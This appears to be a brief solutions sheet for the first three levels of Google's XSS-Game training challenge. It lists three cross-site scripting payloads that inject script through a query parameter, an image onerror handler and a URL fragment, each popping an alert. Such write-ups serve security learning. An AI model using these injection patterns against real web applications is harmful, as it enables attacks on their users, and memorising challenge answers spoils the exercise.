# XSS-Game by Google

### Level 1
```
https://xss-game.appspot.com/level1/frame?query=<script>alert("HACKED")</script>
```

### Level 2
```
<img src="asdf" onerror='alert("HACKED")' />
```

### Level 3
```
https://xss-game.appspot.com/level3/frame/#"/><img src='asdf' onerror='alert("HACKED")'/>
```
